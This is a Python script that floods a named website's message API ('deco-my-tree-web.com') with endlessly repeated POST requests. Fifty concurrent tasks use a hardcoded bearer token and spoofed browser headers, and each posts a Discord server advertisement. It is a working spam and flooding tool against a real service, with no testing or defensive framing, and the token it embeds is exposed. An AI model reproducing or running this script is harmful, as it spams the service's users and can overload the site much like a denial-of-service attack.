import aiohttp
import asyncio


url = "https://deco-my-tree-web.com/api/v1/message/HULENca6EUBE"
headers = {
    "Host": "deco-my-tree-web.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "*/*",
    "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "Referer": "https://decomytree.com/",
    "Origin": "https://decomytree.com",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Authorization": "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzI3MzY1MDQsImlhdCI6MTczMjczMjkwNCwidXNlcl9pZCI6MH0.saa0XJ-MAXqOJWNjlLf0GPcsJt1QBf15hEkuCRcmAWPpWPiKbcmeYQAfGyKTO4OHGw8ctz0-Y7jxLZ40-00JWg",
    "Connection": "keep-alive",
    "DNT": "1",
    "Sec-GPC": "1",
}


data = {
    "name": "Sowwyz",
    "content": "https://discord.gg/1925 welcome to my server",
    "deco_index": 19,
    "only_for_user": False,
}


async def send_request(session):
    while True:
        try:
            async with session.post(url, headers=headers, json=data) as response:
                # Yanıt bilgilerini yazdır
                print(f"Durum Kodu: {response.status} | Yanıt: {await response.text()}")
        except Exception as e:
            print(f"Hata: {e}")


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(50)] 
        await asyncio.gather(*tasks)


asyncio.run(main())
